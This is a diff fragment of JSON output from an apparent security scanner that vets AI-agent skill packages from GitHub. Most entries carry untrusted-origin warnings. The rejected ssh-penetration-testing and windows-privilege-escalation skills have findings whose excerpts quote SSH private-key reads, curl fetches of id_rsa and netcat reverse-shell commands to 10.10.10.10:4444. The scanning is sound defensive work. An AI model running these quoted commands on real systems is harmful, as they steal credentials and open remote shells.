+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "ssh-penetration-testing": {
+      "ref": "sickn33/antigravity-awesome-skills@ssh-penetration-testing",
+      "skillKey": "ssh-penetration-testing",
+      "verdict": "rejected",
+      "scannedAt": "2026-05-27T02:52:42.549Z",
+      "findings": [
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "SKILL.md",
+          "excerpt": "on locations for private keys ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa"
+        },
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "SKILL.md",
+          "excerpt": "s ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519 /etc/ssh/ss"
+        },
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "SKILL.md",
+          "excerpt": "~/.ssh/id_dsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519 /etc/ssh/ssh_host_*_key /root"
+        },
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "SKILL.md",
+          "excerpt": "get) curl -s http://target.com/.ssh/id_rsa curl -s http://target.com/id_"
+        },
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "SKILL.md",
+          "excerpt": "h/ cat ~/.ssh/known_hosts cat ~/.ssh/authorized_keys # Add persistence (add your"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "SSH access: ```bash # Check sudo privileges sudo -l # Find SS"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "SKILL.md",
+          "excerpt": "`bash # Check sudo privileges sudo -l # Find SSH keys find / -n"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "tavily-web": {
+      "ref": "sickn33/antigravity-awesome-skills@tavily-web",
+      "skillKey": "tavily-web",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:42.549Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "windows-privilege-escalation": {
+      "ref": "sickn33/antigravity-awesome-skills@windows-privilege-escalation",
+      "skillKey": "windows-privilege-escalation",
+      "verdict": "rejected",
+      "scannedAt": "2026-05-27T02:52:42.550Z",
+      "findings": [
+        {
+          "severity": "critical",
+          "code": "reverse_shell_nc",
+          "message": "netcat reverse-shell pattern (nc -e).",
+          "file": "SKILL.md",
+          "excerpt": "config <service> binpath= \"C:\\nc.exe -e cmd.exe 10.10.10.10 4444\" sc"
+        },
+        {
+          "severity": "critical",
+          "code": "reverse_shell_nc",
+          "message": "netcat reverse-shell pattern (nc -e).",
+          "file": "SKILL.md",
+          "excerpt": "tem32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.10.10 4444 -e cmd.exe\" -t * # PrintSpoofer"
+        },
+        {
+          "severity": "critical",
+          "code": "reverse_shell_nc",
+          "message": "netcat reverse-shell pattern (nc -e).",
+          "file": "SKILL.md",
+          "excerpt": "ato.exe -r 10.10.10.10 -e \"C:\\nc.exe 10.10.10.10 4444 -e cmd.exe\" -l 9999 # GodPotato"
+        },
+        {
+          "severity": "critical",
+          "code": "reverse_shell_nc",
+          "message": "netcat reverse-shell pattern (nc -e).",
+          "file": "SKILL.md",
+          "excerpt": "ice binpath= \"C:\\Users\\Public\\nc.exe 10.10.10.10 4444 -e cmd.exe\" sc start MyService"
+        },
+        {
+          "severity": "critical",
+          "code": "reverse_shell_nc",
+          "message": "netcat reverse-shell pattern (nc -e).",
+          "file": "SKILL.md",
+          "excerpt": "md.exe -a \"/c c:\\users\\public\\nc.exe 10.10.10.10 4444 -e cmd.exe\" -t * -c {F87B28F1-DA"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sickn33/antigravity-awesome-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "python": {
+      "ref": "siviter-xyz/dot-agent@python",
+      "skillKey": "python",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:43.541Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/siviter-xyz/dot-agent is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "tavily-ai/tavily-plugins@research": {
+      "ref": "tavily-ai/tavily-plugins@research",
+      "skillKey": "tavily-ai/tavily-plugins@research",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:44.148Z",
+      "findings": [
+        {
+          "severity": "info",
+          "code": "import_error",
+          "message": "Command failed: git clone --depth=1 --quiet https://github.com/tavily-ai/tavily-plugins.git /tmp/autoflow-skills-3aY6hD/repo\nfatal: could not read Username for 'https://github.com': No such device or address\n"
+        }
+      ]
+    },
+    "convex-agents": {
+      "ref": "waynesutton/convexskills@convex-agents",
+      "skillKey": "convex-agents",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.705Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-best-practices": {
+      "ref": "waynesutton/convexskills@convex-best-practices",
+      "skillKey": "convex-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.706Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-component-authoring": {
+      "ref": "waynesutton/convexskills@convex-component-authoring",
+      "skillKey": "convex-component-authoring",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.706Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-cron-jobs": {
+      "ref": "waynesutton/convexskills@convex-cron-jobs",
+      "skillKey": "convex-cron-jobs",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.707Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-file-storage": {
+      "ref": "waynesutton/convexskills@convex-file-storage",
+      "skillKey": "convex-file-storage",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.708Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-functions": {
+      "ref": "waynesutton/convexskills@convex-functions",
+      "skillKey": "convex-functions",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.708Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-http-actions": {
+      "ref": "waynesutton/convexskills@convex-http-actions",
+      "skillKey": "convex-http-actions",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.709Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "SKILL.md",
+          "excerpt": "ripe = new Stripe(process.env.STRIPE_SECRET_KEY!); export const verifyAndPro"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-migrations": {
+      "ref": "waynesutton/convexskills@convex-migrations",
+      "skillKey": "convex-migrations",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.710Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-realtime": {
+      "ref": "waynesutton/convexskills@convex-realtime",
+      "skillKey": "convex-realtime",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.711Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-schema-validator": {
+      "ref": "waynesutton/convexskills@convex-schema-validator",
+      "skillKey": "convex-schema-validator",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.711Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-security-audit": {
+      "ref": "waynesutton/convexskills@convex-security-audit",
+      "skillKey": "convex-security-audit",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.712Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "SKILL.md",
+          "excerpt": "const stripeKey = process.env.STRIPE_SECRET_KEY; // Process payment"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "convex-security-check": {
+      "ref": "waynesutton/convexskills@convex-security-check",
+      "skillKey": "convex-security-check",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:45.713Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/waynesutton/convexskills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "coding-guidelines": {
+      "ref": "zhanghandong/rust-skills@coding-guidelines",
+      "skillKey": "coding-guidelines",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.534Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "m01-ownership": {
+      "ref": "zhanghandong/rust-skills@m01-ownership",
+      "skillKey": "m01-ownership",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.535Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "m04-zero-cost": {
+      "ref": "zhanghandong/rust-skills@m04-zero-cost",
+      "skillKey": "m04-zero-cost",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.535Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "m05-type-driven": {
+      "ref": "zhanghandong/rust-skills@m05-type-driven",
+      "skillKey": "m05-type-driven",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.536Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "m06-error-handling": {
+      "ref": "zhanghandong/rust-skills@m06-error-handling",
+      "skillKey": "m06-error-handling",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.536Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "m07-concurrency": {
+      "ref": "zhanghandong/rust-skills@m07-concurrency",
+      "skillKey": "m07-concurrency",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.538Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "m10-performance": {
+      "ref": "zhanghandong/rust-skills@m10-performance",
+      "skillKey": "m10-performance",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.538Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "m12-lifecycle": {
+      "ref": "zhanghandong/rust-skills@m12-lifecycle",
+      "skillKey": "m12-lifecycle",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:50.538Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/zhanghandong/rust-skills is not on the trusted-org allowlist; review the maintainer."
         }
       ]
     }
